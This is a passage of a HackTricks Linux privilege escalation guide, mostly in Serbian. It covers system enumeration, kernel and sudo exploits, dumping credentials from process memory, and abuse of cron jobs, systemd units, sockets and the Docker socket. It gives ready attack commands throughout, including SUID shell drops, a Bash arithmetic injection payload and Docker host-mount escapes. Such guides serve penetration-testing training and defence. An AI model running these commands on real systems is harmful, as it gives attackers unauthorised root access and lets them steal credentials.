# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistemske informacije

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o OS-u koji radi
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ako imate **write permissions on any folder inside the `PATH`** varijable, možda ćete moći da hijack-ujete neke biblioteke ili binarne fajlove:
```bash
echo $PATH
```
### Env info

Postoje li zanimljive informacije, lozinke ili API keys u environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji može da se iskoristi za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernel-a i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete pronaći neke već **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve verzije ranjivih kernel-a sa te veb-stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u traženju kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenuti NA victim-u, proverava samo exploits za kernel 2.x)

Uvek **pretražite kernel verziju na Google-u**, možda je vaša kernel verzija navedena u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

Dodatne tehnike kernel exploitation-a:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Verzije sudo pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju neprivilegovanim lokalnim korisnicima da eskaliraju privilegije na root putem sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma koji kontroliše korisnik.

Evo [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [vulnerability]. Pre pokretanja exploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` feature.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Pogledaj **smasher2 box of HTB** za **primer** kako se ova vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više enumeracije sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabroj moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container, možete pokušati da iz njega pobegnete:

{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano i šta nije montirano**, gde i zašto. Ako je nešto odmontirano, možete pokušati da ga montirate i proverite ima li privatnih informacija.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Navedite korisne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite **da li je instaliran bilo koji compiler**. Ovo je korisno ako treba da koristite neki **kernel exploit**, pošto se preporučuje da ga compile-ujete na mašini na kojoj ćete ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjiv softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuju aplikacije poput OpenVAS ili slične koje će proveriti da li je neka verzija instaliranog softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li rade [**electron/cef/chromium debuggers** — možete ih iskoristiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati neki.

### Process monitoring

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za nadgledanje procesa. Ovo može biti veoma korisno za identifikaciju ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **credentials u čistom tekstu u memoriji**.\
Obično će vam trebati **root privileges** da pročitate memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada ste već root i želite otkriti više credentials.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da većina mašina danas **ne dozvoljava ptrace po defaultu**, što znači da ne možete dump-ovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debugovani, dok god imaju isti uid. Ovo je klasičan način na koji je ptrace radio.
> - **kernel.yama.ptrace_scope = 1**: samo roditeljski proces može biti debugovan.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE privilegiju.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može biti praćen pomoću ptrace. Nakon podešavanja, potreban je reboot da bi se ptrace ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dohvatiti Heap i pretražiti u njemu credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuju kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuju **dozvole svake mapirane oblasti**. Pseudo fajl **mem izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske oblasti čitljive** i njihove offset-e. Koristimo ove informacije da **seek into the mem file and dump all readable regions** u datoteku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti korišćenjem /dev/kmem.\
Tipično, `/dev/mem` je čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je za Linux nova verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti potrebu za root-om i dump-ovati proces koji pripada vama
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je authenticator process pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dumpovati proces (pogledajte prethodne sekcije da pronađete različite načine za dumpovanje memorije procesa) i potražiti credentials u memoriji:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Za pravilno funkcionisanje zahteva root privilegije.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Pretraga po regex-ovima/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) pokrenut kao root – web-bazirani scheduler privesc

Ako web „Crontab UI“ panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti preko SSH lokalnog port-forwardinga i kreirati privilegovani zadatak za eskalaciju privilegija.

Tipičan tok
- Otkrivanje porta dostupnog samo na loopback interfejsu (npr. 127.0.0.1:8000) i Basic-Auth realm-a preko `ss -ntlp` / `curl -v localhost:8000`
- Pronaći kredencijale u operativnim artefaktima:
  - Rezervne kopije/skripte sa `zip -P <password>`
  - systemd unit koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Uspostavi tunel i prijavi se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj job sa visokim privilegijama i pokreni odmah (ostavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Ne pokrećite Crontab UI kao root; ograničite ga posebnim korisnikom i minimalnim permisijama
- Bindujte na localhost i dodatno ograničite pristup preko firewall/VPN; ne koristite iste lozinke ponovo
- Izbegavajte ugrađivanje secrets u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za on-demand job executions

Proverite da li je neki scheduled job ranjiv. Možda možete iskoristiti skript koji se izvršava od strane root-a (wildcard vuln? možete menjati fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, unutar _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako u ovom crontab-u root korisnik pokuša da izvrši neku komandu ili skript bez postavljanja PATH-a. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako skripta koju pokreće root sadrži “**\***” u okviru komande, možete to iskoristiti da napravite neočekivane stvari (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard postavljen ispred putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

U Bash-u, parameter expansion i command substitution se izvršavaju pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita untrusted log fields i ubacuje ih u arithmetic context, napadač može inject-ovati command substitution $(...) koji se izvršava kao root kada cron pokrene.

- Zašto radi: U Bash-u se ekspanzije dešavaju u ovom redosledu: parameter/variable expansion, command substitution, arithmetic expansion, pa zatim word splitting i pathname expansion. Dakle vrednost poput `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zamenjuje (pokreće komandu), a zatim preostali numerički `0` se koristi za aritmetiku pa skript nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Neka attacker-controlled tekst bude upisan u parsed log tako da polje koje izgleda kao broj sadrži command substitution i završava cifrom. Pobrini se da tvoja komanda ne ispisuje u stdout (ili je preusmeri) kako bi arithmetic ostao validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako možete **izmeniti cron script** koji se izvršava kao root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji se izvršava kao root koristi folder na koji imate potpuni pristup, možda bi bilo korisno obrisati taj folder i napraviti symlink ka drugom folderu koji sadrži script pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Prilagođeno potpisani cron binarni fajlovi sa writable payload-ovima
Blue timovi ponekad "sign" cron-driven binarne fajlove tako što dumpuju prilagođenu ELF sekciju i koriste grep da pronađu vendor string pre nego što ih pokrenu kao root. Ako je taj binarni fajl group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete leak the signing material, možete falsifikovati sekciju i hijack-ovati cron task:

1. Koristite `pspy` da zabeležite tok verifikacije. U Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor` nakon čega je izvršio `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potom pokrenuo fajl.
2. Ponovo kreirajte očekivani sertifikat koristeći the leaked key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite zlonamernu zamenu (npr. drop a SUID bash, add your SSH key) i ubacite sertifikat u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite zakazani binarni fajl pritom zadržavajući izvršne bitove:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće pokretanje cron-a; kad naivna provera potpisa uspe, vaš payload će se izvršiti kao root.

### Česti cron zadaci

Možete pratiti procese kako biste pronašli one koji se izvršavaju na svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i eskalirati privilegije.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minuta**, **sortirali po najmanje izvršavanim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i navesti svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob tako što ćete staviti carriage return nakon komentara (bez newline karaktera), i cronjob će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proveri da li možeš da upišeš bilo koji `.service` fajl, i ako možeš, **možeš ga izmeniti** tako da **pokreće** tvoj **backdoor kada** servis bude **pokrenut**, **restartovan** ili **zaustavljen** (možda ćeš morati da sačekaš dok se mašina ne restartuje).\
Na primer kreiraj svoj backdoor unutar .service fajla koristeći **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imaj na umu da ako imaš **prava za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možeš ih izmeniti da sadrže backdoors, tako da kada se servisi ponovo izvrše, backdoors budu pokrenuti.

### systemd PATH - Relativne putanje

Možeš videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako ustanovite da možete **pisati** u bilo kom od direktorijuma na putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne puteve koji se koriste u fajlovima konfiguracije servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim napravite **izvršni fajl** sa **istim imenom kao binarni fajl na relativnoj putanji** u systemd PATH folderu u koji možete pisati, i kada se od servisa zatraži izvršenje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu startovati/zaustaviti servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije ime se završava u `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje po kalendaru i monotone vremenske događaje i mogu se pokretati asinhrono.

Možete izlistati sve timers pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu menjati

Ako možete izmeniti timer, možete ga naterati da pokrene neke postojeće systemd.unit (kao `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja će biti aktivirana kada ovaj timer istekne. Argument je ime jedinice čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na servis koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu potrebno je da:

- Pronađete neku systemd jedinicu (na primer `.service`) koja je **izvršava zapisiv binarni fajl**
- Pronađete neku systemd jedinicu koja **izvršava relativnu putanju** i nad kojom imate **privilegije za pisanje** u **systemd PATH** (da imitirate taj izvršni fajl)

**Saznajte više o timer-ima pomoću `man systemd.timer`.**

### **Omogućavanje timer-a**

Da biste omogućili timer, potrebne su root privilegije i potrebno je da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **komunikaciju između procesa** na istim ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i podešavaju se kroz `.socket` fajlove.

Sockets mogu biti konfigurisani pomoću `.socket` fajlova.

**Learn more about sockets with `man systemd.socket`.** U ovom fajlu može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali u suštini služe da **naznače gde će se slušati** socket (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta koji će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće **instanca servisa** i samo konekcioni socket joj se prosleđuje. Ako je **false**, svi listening socket-i se **prosleđuju pokrenutoj service unit-i**, i pokreće se samo jedna service unit za sve konekcije. Ova vrednost se ignoriše za datagram sockets i FIFOs gde jedna service unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisati nove daemone na način pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se izvršavaju **pre** ili **posle** nego što su listening **sockets**/FIFOs **kreirani** i vezani, respektivno. Prvi token komandne linije mora biti apsolutno ime fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se izvršavaju **pre** ili **posle** nego što su listening **sockets**/FIFOs **zatvoreni** i uklonjeni, respektivno.
- `Service`: Navodi ime **service** unit-a koje će se **aktivirati** pri **dolaznom saobraćaju**. Ova opcija je dozvoljena samo za sockets sa `Accept=no`. Podrazumevano je servis koji nosi isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva ne bi trebalo biti neophodno koristiti ovu opciju.

### Writable .socket files

Ako nađete **writable** `.socket` fajl možete **dodati** na početku `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Stoga, **verovatno ćete morati da sačekate restart mašine.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji writable socket** (_sada govorimo o Unix Sockets, a ne o konfiguracionim `.socket` fajlovima_), tada **možete komunicirati** sa tim socket-om i možda iskoristiti neku ranjivost.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** requests (_Ne mislim na .socket fajlove već na fajlove koji funkcionišu kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako soket **odgovori na HTTP** zahtev, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Upisivi Docker Socket

Docker socket, često pronađen na `/var/run/docker.sock`, je kritičan fajl koji treba osigurati. Podrazumevano, upisiv je za `root` korisnika i članove `docker` grupe. Posedovanje write access-a na ovom socketu može dovesti do privilege escalation. Evo pregleda kako se ovo može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate write access na Docker socket, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ovi komandni primeri omogućavaju pokretanje container-a sa root pristupom fajl-sistemu hosta.

#### **Korišćenje Docker API direktno**

U slučajevima kada Docker CLI nije dostupan, docker socket se i dalje može manipulisati pomoću Docker API-ja i `curl` komandi.

1.  **List Docker Images:** Dobijte listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje containera koji mount-uje root direktorijum hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka containeru, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u containeru sa root pristupom fajl-sistemu hosta.

### Ostalo

Imajte na umu da ako imate prava pisanja nad docker socket-om zato što ste **u grupi `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**Docker API sluša na portu** možete ga takođe kompromitovati](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina kako da pobegnete iz docker-a ili da ga zloupotrebite za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

